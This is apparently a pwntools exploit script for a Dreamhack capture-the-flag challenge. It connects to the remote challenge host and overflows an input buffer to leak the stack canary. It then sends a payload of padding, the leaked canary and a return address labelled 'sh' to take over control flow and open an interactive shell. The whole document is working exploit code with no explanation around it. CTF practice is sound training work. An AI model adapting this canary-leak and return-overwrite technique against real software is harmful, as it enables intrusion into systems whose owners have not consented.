from pwn import *
context.log_level = 'debug'

#p = process('./chall')
p = remote('host3.dreamhack.games', 15306)

sh = 0x401216
p.recvuntil(b'name: ')
p.send(b'a' * 56)
p.recvuntil(b'age: ')
p.sendline(b'1234567891')
p.recvuntil(b'height: ')
p.sendline(b'1234567891234567')
p.recvuntil(b'(Male) or F (Female): ')
p.send(b'FFFFF')

p.recvuntil(b'Hi ' + b'a' * 56)
leak = p.recv(8 + 4 + 5 + 7)
print(f'leak: {hexdump(leak)}')
canary = leak[17:24]
canary = u64(b'\x00' + canary)  
print(f'canary: {hex(canary)}') 

p.recvuntil(b'nationality? ')

payload = b'a' * 104
payload += p64(canary)
payload += b'a' * 8
payload += p64(sh)

p.sendline(payload)
p.interactive()
 